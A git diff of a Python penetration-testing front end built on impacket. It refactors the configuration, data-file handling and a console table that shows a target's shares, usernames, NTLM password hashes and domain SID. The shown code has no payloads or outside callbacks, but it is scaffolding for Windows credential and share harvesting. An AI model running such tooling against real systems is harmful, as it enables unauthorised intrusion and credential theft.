@@ -2,15 +2,15 @@
 # coding:UTF-8
 
 # -------------------------------------------------------------------------------------
-#      PYTHON SCRIPT FILE FOR THE FORENSIC ANALYSIS OF REMOTE COMPUTER SYSTEMS
+#          PYTHON SCRIPT FILE FOR THE REMOTE ANALYSIS OF COMPUTER SYSTEMS
 #         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
 # -------------------------------------------------------------------------------------
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Load required imports.
+# Version : @g3nT_0r@nG3                                                              
+# Details : Load any required imports.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -33,8 +33,8 @@ from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Conduct simple and routine tests on any user supplied arguements.   
+# Version : @g3nT_0r@nG3                                                              
+# Details : Check running as root.   
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
@@ -45,73 +45,63 @@ if os.geteuid() != 0:
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Create local user definable variables.
+# Version : @g3nT_0r@nG3                                                              
+# Details : Create local user-friendly variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-colour1 = "yellow"						# SYSTEM COLOURS
-colour2 = "green"
-colour3 = "white"
-colour4 = "red"
-colour5 = "blue"
-colour6 = "magenta"
-colour7 = "cyan"
-colour8 = "white"
-colour9 = "black"
+bughunt = 0							# 0 OFF 1 ON
+splashs = 1							# 0 OFF 1 ON
+maximum = 5000							# TOTAL NUMBER OF USERS
 
-network = "tun0"						# LOCAL NETWORK
-workdir = "MASTER"						# WORKING DIRECTORY
+colour1 = "red"							# SYSTEM COLOURS
+colour2 = "cyan"
+colour3 = "blue"
+colour4 = "black"
+colour5 = "white"
+colour6 = "white"
+colour7 = "green"
+colour8 = "yellow"
+colour9 = "magenta"
 
-splashs = 1							# SPLASH SCREEN ON/OFF
-bughunt = 0							# BUG HUNT ON/OFF
-maximum = 5000							# MAX USERS - NOTE NOT LIMITED TO 5000
-
-scriptr = "python3"						# PYTHON VERSION
-impacke = "/usr/share/doc/python3-impacket/examples/"		# IMPACKET LOCATION
-keypath = scriptr + " " + impacke				# FULL COMMAND
-
-fileExt = "'(xlsx|docx|doc|txt|xml|bak|zip|php|html|pdf)'"	# TARGET EXTRACTION FILES
+network = "tun0"						# LOCAL INTERFACE
+workdir = "WORKAREA"
+fileExt = "xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf"		# FILE EXTENSIONS
+keypath = "python3 /usr/share/doc/python3-impacket/examples/"	# PATH TO IPACKET
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Obtain the local system IP address.
+# Version : @g3nT_0r@nG3                                                              
+# Details : Obtain the local systems IP address.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
 os.system("ip a s " + network + " | awk '/inet/ {print $2}' > localIP.tmp")
-with open("localIP.tmp", "r") as read:
-   line = read.readline()
-   line = line.rstrip("\n")
-   localIP,null = line.split("/")
-read.close()
+localIP, null = linecache.getline("localIP.tmp", 1).rstrip("\n").split("/")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Create functional calls from main.
+# Version : @g3nT_0r@nG3                                                              
+# Details : Create functional subroutines to be called from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
-def testOne(value):
-   value = 0
+def testOne():
    if TIP[:5] == "EMPTY":
       print("[-] REMOTE IP has not been specified...")
-      value = 1
-   return(value)
+      return 1
+   return 0
    
-def testTwo(value):
-   value = 0
+def testTwo():
    if TIP[:5] == "EMPTY":
       print("[-] REMOTE IP has not been specified...")
-      value = 1
+      return 1
    if DOM[:5] == "EMPTY":
       print("[-] DOMAIN NAME has not been specified...")
-      value = 1
-   return(value)  
+      return 1
+   return 0  
 
 def spacePadding(variable,value):
    variable = variable.rstrip("\n")
@@ -138,317 +128,277 @@ def getTime(value):
 
 def command(variable):
    if bughunt == 1:
-      print(colored(variable, colour3))
+      print(colored(variable, colour5))
    os.system(variable)
    return
  
 def prompt():
    selection = input("\nPress ENTER to continue...")
-   return   
-
-def cleanUsers():
-   for x in range (0, maximum):
-      USER[x] = " "*COL3
-      HASH[x] = " "*COL4
-   return
-   
-def cleanShares():
-   for x in range(0, maximum):
-      SHAR[x] = " "*COL2
-   return
-   
-def cleanTokens():
-   for x in range(0, maximum):
-      VALD[x] = 0
    return
 
 def display():
    print('\u2554' + ('\u2550')*57 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2557')
-   print('\u2551' + (" ")*30 + colored("REMOTE SYSTEM",colour3) +  (" ")*14 + '\u2551' + (" ")*1 + colored("SHARENAME",colour3) + (" ")*7 + colored("TYPE",colour3) + (" ")*6 + colored("COMMENT",colour3) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAME",colour3) + (" ")*16 + colored("NTFS PASSWORD HASH",colour3) + (" ")*15 + '\u2551') 
+   print('\u2551' + (" ")*30 + colored("REMOTE SYSTEM",colour5) +  (" ")*14 + '\u2551' + (" ")*1 + colored("SHARENAME",colour5) + (" ")*7 + colored("TYPE",colour5) + (" ")*6 + colored("COMMENT",colour5) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAME",colour5) + (" ")*16 + colored("NTFS PASSWORD HASH",colour5) + (" ")*15 + '\u2551') 
    print('\u2560' + ('\u2550')*14 + '\u2564' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u2563')
 
 # -------------------------------------------------------------------------------------
  
    print('\u2551' + " DNS SERVER   " + '\u2502', end=' ')
    if DNS[:5] == "EMPTY":
-      print(colored(DNS[:COL1],colour1), end=' ')
+      print(colored(DNS[:COL1],colour8), end=' ')
    else:
-      print(colored(DNS[:COL1],colour2), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(DNS[:COL1],colour7), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[0]:
-      print(colored(SHAR[0],colour5), end=' ')
+      print(colored(SHAR[0],colour3), end=' ')
    else:
-      print(colored(SHAR[0],colour2), end=' ')
-   
+      print(colored(SHAR[0],colour7), end=' ')   
    print('\u2551', end=' ')   
    if VALD[0] == "1":
-      print(colored(USER[0],colour5), end=' ')
-      print(colored(HASH[0],colour5), end=' ')
+      print(colored(USER[0],colour3), end=' ')
+      print(colored(HASH[0],colour3), end=' ')
    else:
-      print(colored(USER[0],colour2), end=' ')
-      print(colored(HASH[0],colour2), end=' ')   
+      print(colored(USER[0],colour7), end=' ')
+      print(colored(HASH[0],colour7), end=' ')   
    print('\u2551')
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " REMOTE IP    " + '\u2502', end=' ')
    if TIP[:5] == "EMPTY":
-      print(colored(TIP[:COL1],colour1), end=' ')
+      print(colored(TIP[:COL1],colour8), end=' ')
    else:
-      print(colored(TIP[:COL1],colour2), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(TIP[:COL1],colour7), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[1]:
-      print(colored(SHAR[1],colour5), end=' ')
+      print(colored(SHAR[1],colour3), end=' ')
    else:
-      print(colored(SHAR[1],colour2), end=' ')
-   
+      print(colored(SHAR[1],colour7), end=' ')   
    print('\u2551', end=' ')   
    if VALD[1] == "1":
-      print(colored(USER[1],colour5), end=' ')
-      print(colored(HASH[1],colour5), end=' ')
+      print(colored(USER[1],colour3), end=' ')
+      print(colored(HASH[1],colour3), end=' ')
    else:
-      print(colored(USER[1],colour2), end=' ')
-      print(colored(HASH[1],colour2), end=' ')         
+      print(colored(USER[1],colour7), end=' ')
+      print(colored(HASH[1],colour7), end=' ')         
    print('\u2551')
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " LIVE PORTS   " + '\u2502', end=' ')
    if POR[:5] == "EMPTY":
-      print(colored(POR[:COL1],colour1), end=' ')
+      print(colored(POR[:COL1],colour8), end=' ')
    else:
       lastChar = POR[COL1-1]
-      print(colored(POR[:COL1-1],colour2) + colored(lastChar,colour4), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(POR[:COL1-1],colour7) + colored(lastChar,colour1), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[2]:
-      print(colored(SHAR[2],colour5), end=' ')
+      print(colored(SHAR[2],colour3), end=' ')
    else:
-      print(colored(SHAR[2],colour2), end=' ')
-   
+      print(colored(SHAR[2],colour7), end=' ')   
    print('\u2551', end=' ')   
    if VALD[2] == "1":
-      print(colored(USER[2],colour5), end=' ')
-      print(colored(HASH[2],colour5), end=' ')
+      print(colored(USER[2],colour3), end=' ')
+      print(colored(HASH[2],colour3), end=' ')
    else:
-      print(colored(USER[2],colour2), end=' ')
-      print(colored(HASH[2],colour2), end=' ')         
+      print(colored(USER[2],colour7), end=' ')
+      print(colored(HASH[2],colour7), end=' ')         
    print('\u2551') 
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " WEB ADDRESS  " + '\u2502', end=' ')
    if WEB[:5] == "EMPTY":
-      print(colored(WEB[:COL1],colour1), end=' ')
+      print(colored(WEB[:COL1],colour8), end=' ')
    else:
-      print(colored(WEB[:COL1],colour2), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(WEB[:COL1],colour7), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[3]:
-      print(colored(SHAR[3],colour5), end=' ')
+      print(colored(SHAR[3],colour3), end=' ')
    else:
-      print(colored(SHAR[3],colour2), end=' ')
-   
+      print(colored(SHAR[3],colour7), end=' ')   
    print('\u2551', end=' ')   
    if VALD[3] == "1":
-      print(colored(USER[3],colour5), end=' ')
-      print(colored(HASH[3],colour5), end=' ')
+      print(colored(USER[3],colour3), end=' ')
+      print(colored(HASH[3],colour3), end=' ')
    else:
-      print(colored(USER[3],colour2), end=' ')
-      print(colored(HASH[3],colour2), end=' ')         
+      print(colored(USER[3],colour7), end=' ')
+      print(colored(HASH[3],colour7), end=' ')         
    print('\u2551')
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " USER NAME    " + '\u2502', end=' ')
    if USR[:2] == "''":
-      print(colored(USR[:COL1],colour1), end=' ')
+      print(colored(USR[:COL1],colour8), end=' ')
    else:
-      print(colored(USR[:COL1],colour2), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(USR[:COL1],colour7), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[4]:
-      print(colored(SHAR[4],colour5), end=' ')
+      print(colored(SHAR[4],colour3), end=' ')
    else:
-      print(colored(SHAR[4],colour2), end=' ')
-   
+      print(colored(SHAR[4],colour7), end=' ')   
    print('\u2551', end=' ')
    if VALD[4] == "1":
-      print(colored(USER[4],colour5), end=' ')
-      print(colored(HASH[4],colour5), end=' ')
+      print(colored(USER[4],colour3), end=' ')
+      print(colored(HASH[4],colour3), end=' ')
    else:
-      print(colored(USER[4],colour2), end=' ')
-      print(colored(HASH[4],colour2), end=' ')   
+      print(colored(USER[4],colour7), end=' ')
+      print(colored(HASH[4],colour7), end=' ')   
    print('\u2551')
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " PASS WORD    " + '\u2502', end=' ')
    if PAS[:2] == "''":
-      print(colored(PAS[:COL1],colour1), end=' ')
+      print(colored(PAS[:COL1],colour8), end=' ')
    else:
-      print(colored(PAS[:COL1],colour2), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(PAS[:COL1],colour7), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[5]:
-      print(colored(SHAR[5],colour5), end=' ')
+      print(colored(SHAR[5],colour3), end=' ')
    else:
-      print(colored(SHAR[5],colour2), end=' ')
-   
+      print(colored(SHAR[5],colour7), end=' ')   
    print('\u2551', end=' ')   
    if VALD[5] == "1":
-      print(colored(USER[5],colour5), end=' ')
-      print(colored(HASH[5],colour5), end=' ')
+      print(colored(USER[5],colour3), end=' ')
+      print(colored(HASH[5],colour3), end=' ')
    else:
-      print(colored(USER[5],colour2), end=' ')
-      print(colored(HASH[5],colour2), end=' ')         
+      print(colored(USER[5],colour7), end=' ')
+      print(colored(HASH[5],colour7), end=' ')         
    print('\u2551')
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " NTLM HASH    " + '\u2502', end=' ')
    if NTM[:5] == "EMPTY":
-      print(colored(NTM[:COL1],colour1), end=' ')
+      print(colored(NTM[:COL1],colour8), end=' ')
    else:
-      print(colored(NTM[:COL1],colour2), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(NTM[:COL1],colour7), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[6]:
-      print(colored(SHAR[6],colour5), end=' ')
+      print(colored(SHAR[6],colour3), end=' ')
    else:
-      print(colored(SHAR[6],colour2), end=' ')
-   
+      print(colored(SHAR[6],colour7), end=' ')   
    print('\u2551', end=' ')   
    if VALD[6] == "1":
-      print(colored(USER[6],colour5), end=' ')
-      print(colored(HASH[6],colour5), end=' ')
+      print(colored(USER[6],colour3), end=' ')
+      print(colored(HASH[6],colour3), end=' ')
    else:
-      print(colored(USER[6],colour2), end=' ')
-      print(colored(HASH[6],colour2), end=' ')         
+      print(colored(USER[6],colour7), end=' ')
+      print(colored(HASH[6],colour7), end=' ')         
    print('\u2551')
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " DOMAIN NAME  " + '\u2502', end=' ')
    if DOM[:5] == "EMPTY":
-      print(colored(DOM[:COL1],colour1), end=' ')
+      print(colored(DOM[:COL1],colour8), end=' ')
    else:
-      print(colored(DOM[:COL1],colour2), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(DOM[:COL1],colour7), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[7]:
-      print(colored(SHAR[7],colour5), end=' ')
+      print(colored(SHAR[7],colour3), end=' ')
    else:
-      print(colored(SHAR[7],colour2), end=' ')
-      
+      print(colored(SHAR[7],colour7), end=' ')      
    print('\u2551', end=' ')   
    if VALD[7] == "1":
-      print(colored(USER[7],colour5), end=' ')
-      print(colored(HASH[7],colour5), end=' ')
+      print(colored(USER[7],colour3), end=' ')
+      print(colored(HASH[7],colour3), end=' ')
    else:
-      print(colored(USER[7],colour2), end=' ')
-      print(colored(HASH[7],colour2), end=' ')         
+      print(colored(USER[7],colour7), end=' ')
+      print(colored(HASH[7],colour7), end=' ')         
    print('\u2551')
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " DOMAIN SID   " + '\u2502', end=' ')
    if SID[:5] == "EMPTY":
-      print(colored(SID[:COL1],colour1), end=' ')
+      print(colored(SID[:COL1],colour8), end=' ')
    else:
-      print(colored(SID[:COL1],colour2), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(SID[:COL1],colour7), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[8]:
-      print(colored(SHAR[8],colour5), end=' ')
+      print(colored(SHAR[8],colour3), end=' ')
    else:
-      print(colored(SHAR[8],colour2), end=' ')
-   
+      print(colored(SHAR[8],colour7), end=' ')   
    print('\u2551', end=' ')   
    if VALD[8] == "1":
-      print(colored(USER[8],colour5), end=' ')
-      print(colored(HASH[8],colour5), end=' ')
+      print(colored(USER[8],colour3), end=' ')
+      print(colored(HASH[8],colour3), end=' ')
    else:
-      print(colored(USER[8],colour2), end=' ')
-      print(colored(HASH[8],colour2), end=' ')         
+      print(colored(USER[8],colour7), end=' ')
+      print(colored(HASH[8],colour7), end=' ')         
    print('\u2551')     
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " SHARE NAME   " + '\u2502', end=' ')
    if TSH[:5] == "EMPTY":
-      print(colored(TSH[:COL1],colour1), end=' ')
+      print(colored(TSH[:COL1],colour8), end=' ')
    else:
-      print(colored(TSH[:COL1],colour2), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(TSH[:COL1],colour7), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[9]:
-      print(colored(SHAR[9],colour5), end=' ')
+      print(colored(SHAR[9],colour3), end=' ')
    else:
-      print(colored(SHAR[9],colour2), end=' ')
-      
+      print(colored(SHAR[9],colour7), end=' ')      
    print('\u2551', end=' ')   
    if VALD[9] == "1":
-      print(colored(USER[9],colour5), end=' ')
-      print(colored(HASH[9],colour5), end=' ')
+      print(colored(USER[9],colour3), end=' ')
+      print(colored(HASH[9],colour3), end=' ')
    else:
-      print(colored(USER[9],colour2), end=' ')
-      print(colored(HASH[9],colour2), end=' ')      
+      print(colored(USER[9],colour7), end=' ')
+      print(colored(HASH[9],colour7), end=' ')      
    print('\u2551')        
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " SERVER TIME  " + '\u2502', end=' ')
    if SKEW == 0:
-      print(colored(LTM[:COL1],colour1), end=' ')
+      print(colored(LTM[:COL1],colour8), end=' ')
    else:
-      print(colored(LTM[:COL1],colour2), end=' ')
-   print('\u2551', end=' ')
-   
+      print(colored(LTM[:COL1],colour7), end=' ')
+   print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[10]:
-      print(colored(SHAR[10],colour5), end=' ')
+      print(colored(SHAR[10],colour3), end=' ')
    else:
-      print(colored(SHAR[10],colour2), end=' ')
-   
+      print(colored(SHAR[10],colour7), end=' ')   
    print('\u2551', end=' ')   
    if VALD[10] == "1":
-      print(colored(USER[10],colour5), end=' ')
-      print(colored(HASH[10],colour5), end=' ')
+      print(colored(USER[10],colour3), end=' ')
+      print(colored(HASH[10],colour3), end=' ')
    else:
-      print(colored(USER[10],colour2), end=' ')
-      print(colored(HASH[10],colour2), end=' ')         
+      print(colored(USER[10],colour7), end=' ')
+      print(colored(HASH[10],colour7), end=' ')         
    print('\u2551')   
    
 # -------------------------------------------------------------------------------------
 
    print('\u2551' + " WORK FOLDER  " + '\u2502', end=' ')
-   if DIR[:6] == workdir:
-      print(colored(DIR[:COL1],colour1), end=' ')
+   if DIR.rstrip(" ") == workdir:
+      print(colored(DIR[:COL1],colour8), end=' ')
    else:
-      print(colored(DIR[:COL2],colour2), end=' ')
-   print('\u2551', end=' ')    
-   
+      print(colored(DIR[:COL2],colour7), end=' ')
+   print('\u2551', end=' ')       
    if SHAR[12][:1] != " ":
       print(colored(SHAR[11],'red'), end=' ')
    else:
       if TSH.rstrip(" ") in SHAR[11]:
-         print(colored(SHAR[11],colour5), end=' ')
+         print(colored(SHAR[11],colour3), end=' ')
       else:
-         print(colored(SHAR[11],colour2), end=' ')
-      
+         print(colored(SHAR[11],colour7), end=' ')      
    print('\u2551', end=' ')   
    if VALD[11] == "1":
-      print(colored(USER[11],colour5), end=' ')
-      print(colored(HASH[11],colour5), end=' ')
+      print(colored(USER[11],colour3), end=' ')
+      print(colored(HASH[11],colour3), end=' ')
    else:
       if USER[12][:1] != " ":   
-         print(colored(USER[11],colour4), end=' ')
-         print(colored(HASH[11],colour4), end=' ')
+         print(colored(USER[11],colour1), end=' ')
+         print(colored(HASH[11],colour1), end=' ')
       else:
-         print(colored(USER[11],colour2), end=' ')
-         print(colored(HASH[11],colour2), end=' ')   
+         print(colored(USER[11],colour7), end=' ')
+         print(colored(HASH[11],colour7), end=' ')   
    print('\u2551')     
    
 # -------------------------------------------------------------------------------------
@@ -471,8 +421,8 @@ def options():
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : Pr0J3CT_M@k30V3r                                                               
-# Details : Display universal banner.
+# Version : @g3nT_0r@nG3                                                              
+# Details : Display program banner and boot system.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
@@ -490,7 +440,7 @@ print("               BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)      
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Boot the system and initialise program files and variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -500,115 +450,102 @@ print("[+] Using localhost IP address " + localIP + "...")
 
 if not os.path.exists(workdir):
    os.mkdir(workdir)
-   print("[+] Work directory created...")
+   print("[+] Directory " + workdir + " created...")
 else:
-   print("[-] Work directory already exists...")		# DEFAULT WORK DIRECTORY
-
-if not os.path.exists("usernames.txt"):			
-   command("touch usernames.txt")
-   print("[+] File usernames.txt created...")
-else:
-   print("[-] File usernames.txt already exists...")		# DEFUALT USERNAME LIST
+   print("[-] Directory " + workdir + " already exists...")
    
-if not os.path.exists("passwords.txt"):			
-   command("touch passwords.txt")
-   print("[+] File passwords.txt created...")
+if not os.path.exists("DATAFILES"):
+   os.mkdir("DATAFILES")
+   print("[+] Directory DATAFILES created...")
 else:
-   print("[-] File passwords.txt already exists...")		# DEFUALT PASSWORD LIST
-
-if not os.path.exists("hashes.txt"):			
-   command("touch hashes.txt")
-   print("[+] File hashes.txt created...")
-else:
-   print("[-] File hashes.txt already exists...")		# DEFUALT HASHFILE LIST
-   
-if not os.path.exists("shares.txt"):
-   command("touch shares.txt")
-   print("[+] File shares.txt created...")
-else:
-   print("[-] File shares.txt already exists...")		# DEFUALT SHARES LIST
-   
-if not os.path.exists("tokens.txt"):
-   command("touch tokens.txt")
-   print("[+] File tokens.txt created...")
-else:
-   print("[-] File tokens.txt already exists...")		# DEFUALT TOKEN LIST
+   print("[-] Directory DATAFILES already exists...")
    
 print("[+] Populating system variables...")
 
-SKEW = 0         		# TIME SKEW
-DOMC = 0			# DOMAIN COUNTER
-DNSC = 0			# DNS COUNTER
-COL1 = 40	 		# SESSIONS
-COL2 = 44	 		# SHARE NAMES
-COL3 = 23	 		# USER NAMES
-COL4 = 32	 		# HASHED PASSWORDS
-IP46 = "-4"			# IP TYPE
+if not os.path.exists("DATAFILES/usernames.txt"):			
+   command("touch DATAFILES/usernames.txt")
+   print("[+] File usernames.txt created...")
+else:
+   print("[-] File usernames.txt already exists...")
+   
+if not os.path.exists("DATAFILES/passwords.txt"):			
+   command("touch DATAFILES/passwords.txt")
+   print("[+] File passwords.txt created...")
+else:
+   print("[-] File passwords.txt already exists...")
 
-USER = [" "*COL3]*maximum	# USER NAMES
-HASH = [" "*COL4]*maximum	# PASSWORDS
-VALD = ["0"]*maximum		# USER TOKEN
-SHAR = [" "*COL2]*maximum	# SHARE NAMES
+if not os.path.exists("DATAFILES/hashes.txt"):			
+   command("touch DATAFILES/hashes.txt")
+   print("[+] File hashes.txt created...")
+else:
+   print("[-] File hashes.txt already exists...")
+   
+if not os.path.exists("DATAFILES/shares.txt"):
+   command("touch DATAFILES/shares.txt")
+   print("[+] File shares.txt created...")
+else:
+   print("[-] File shares.txt already exists...")
+   
+if not os.path.exists("DATAFILES/tokens.txt"):
+   command("touch DATAFILES/tokens.txt")
+   print("[+] File tokens.txt created...")
+else:
+   print("[-] File tokens.txt already exists...")
+
+SKEW = 0         							# TIME SKEW
+DOMC = 0								# DOMAIN COUNTER
+DNSC = 0								# DNS COUNTER
+COL1 = 40	 							# SESSIONS
+COL2 = 44	 							# SHARE NAMES
+COL3 = 23	 							# USER NAMES
+COL4 = 32	 							# HASHED PASSWORDS
+COL5 = 1								# TOKENS
+IP46 = "-4"								# IP TYPE
+
+SHAR = [" "*COL2]*maximum						# SHARE NAMES
+USER = [" "*COL3]*maximum						# USER NAMES
+HASH = [" "*COL4]*maximum						# PASSWORDS
+VALD = ["0"*COL5]*maximum						# USER TOKEN
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Pr0J3CT_M@k30V3r                                                               
+# Version : @g3nT_0r@nG3                                                              
 # Details : Check the config file for stored variables.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
-if not os.path.exists('config.txt'):
+if not os.path.exists('DATAFILES/config.txt'):
    print("[+] Configuration file not found - using defualt values...")
-   DNS = "EMPTY              " # DNS NAME
-   TIP = "EMPTY              " # REMOTE IP
-   POR = "EMPTY              " # LIVE PORTS
-   WEB = "EMPTY              " # WEB ADDRESS
-   USR = "''                 " # SESSION USERNAME
-   PAS = "''                 " # SESSION PASSWORD       
-   NTM = "EMPTY              " # NTLM HASH
-   DOM = "EMPTY              " # DOMAIN NAME
-   SID = "EMPTY              " # DOMAIN SID
-   TSH = "EMPTY              " # SESSION SHARE
-   LTM = "00:00              " # LOCAL TIME    
-   DIR = workdir	       # DIRECTORY   
-   PTS = POR
-   
+   DNS = "EMPTY              "						# DNS NAME
+   TIP = "EMPTY              " 						# REMOTE IP
+   POR = "EMPTY              " 						# LIVE PORTS
+   WEB = "EMPTY              " 						# WEB ADDRESS
+   USR = "''                 " 						# SESSION USERNAME
+   PAS = "''                 "						# SESSION PASSWORD       
+   NTM = "EMPTY              " 						# NTLM HASH
+   DOM = "EMPTY              " 						# DOMAIN NAME
+   SID = "EMPTY              " 						# DOMAIN SID
+   TSH = "EMPTY              " 						# SESSION SHARE
+   LTM = "00:00              " 						# LOCAL TIME    
+   DIR = workdir	       						# DIRECTORY   
+   PTS = POR		       						# FULL PORT LISTING      
 else:
    print("[+] Configuration file found - restoring saved data....")
-   DNS = linecache.getline('config.txt', 1).rstrip("\n")
-   TIP = linecache.getline('config.txt', 2).rstrip("\n")
-   POR = linecache.getline('config.txt', 3).rstrip("\n")
-   WEB = linecache.getline('config.txt', 4).rstrip("\n")
-   USR = linecache.getline('config.txt', 5).rstrip("\n")
-   PAS = linecache.getline('config.txt', 6).rstrip("\n")
-   NTM = linecache.getline('config.txt', 7).rstrip("\n")
-   DOM = linecache.getline('config.txt', 8).rstrip("\n")	
-   SID = linecache.getline('config.txt', 9).rstrip("\n")
-   TSH = linecache.getline('config.txt', 10).rstrip("\n")
-   LTM = linecache.getline('config.txt', 11).rstrip("\n")
-   DIR = linecache.getline('config.txt', 12).rstrip("\n")      
-   PTS = POR							# KEEP FULL PORT LISTING
+   DNS = linecache.getline('DATAFILES/config.txt', 1).rstrip("\n")
+   TIP = linecache.getline('DATAFILES/config.txt', 2).rstrip("\n")
+   POR = linecache.getline('DATAFILES/config.txt', 3).rstrip("\n")
+   WEB = linecache.getline('DATAFILES/config.txt', 4).rstrip("\n")
+   USR = linecache.getline('DATAFILES/config.txt', 5).rstrip("\n")
+   PAS = linecache.getline('DATAFILES/config.txt', 6).rstrip("\n")
+   NTM = linecache.getline('DATAFILES/config.txt', 7).rstrip("\n")
+   DOM = linecache.getline('DATAFILES/config.txt', 8).rstrip("\n")	
+   SID = linecache.getline('DATAFILES/config.txt', 9).rstrip("\n")
+   TSH = linecache.getline('DATAFILES/config.txt', 10).rstrip("\n")
+   LTM = linecache.getline('DATAFILES/config.txt', 11).rstrip("\n")
+   DIR = linecache.getline('DATAFILES/config.txt', 12).rstrip("\n")      
+   PTS = POR  
    
-   for x in range (0, maximum):
-      USER[x] = linecache.getline("usernames.txt", x + 1).rstrip(" ")
-      USER[x] = spacePadding(USER[x], COL3)
-      
-   for x in range (0, maximum):
-      HASH[x] = linecache.getline("hashes.txt", x + 1).rstrip(" ")
-      if USER[x][:1] == " ":
-         HASH[x] = spacePadding(HASH[x], COL4)
-      else:
-         HASH[x] = dotPadding(HASH[x], COL4)
-         
-   for x in range(0, maximum):
-      SHAR[x] = linecache.getline("shares.txt",x + 1).rstrip(" ")
-      SHAR[x] = SHAR[x].lstrip()
-      SHAR[x] = spacePadding(SHAR[x], COL2)
-      
-   for x in range(0, maximum):
-      VALD[x] = linecache.getline("tokens.txt",x + 1).rstrip("\n")
-
 DNS = spacePadding(DNS, COL1)
 TIP = spacePadding(TIP, COL1)
 POR = spacePadding(POR, COL1)
@@ -622,6 +559,18 @@ TSH = spacePadding(TSH, COL1)
 LTM = spacePadding(LTM, COL1)
 DIR = spacePadding(DIR, COL1)
 
+with open("DATAFILES/usernames.txt", "r") as read1, open("DATAFILES/hashes.txt", "r") as read2, open("DATAFILES/tokens.txt", "r") as read3, open("DATAFILES/shares.txt", "r") as read4:
+   for x in range(0, maximum):
+      USER[x] = read1.readline()
+      HASH[x] = read2.readline()
+      VALD[x] = read3.readline()
+      SHAR[x] = read4.readline()
+      
+      SHAR[x] = spacePadding(SHAR[x], COL2)         
+      USER[x] = spacePadding(USER[x], COL3)
+      HASH[x] = spacePadding(HASH[x], COL4)    
+      VALD[x] = spacePadding(VALD[x], COL5)
+
 if DOM[:5] != "EMPTY":
    command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
    DOMC = 1
@@ -631,37 +580,35 @@ if":" in TIP:
 
 if splashs == 1:
    time.sleep(5)
-   
-checkParams = 0
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : Pr0J3CT_M@k30V3r                                                               
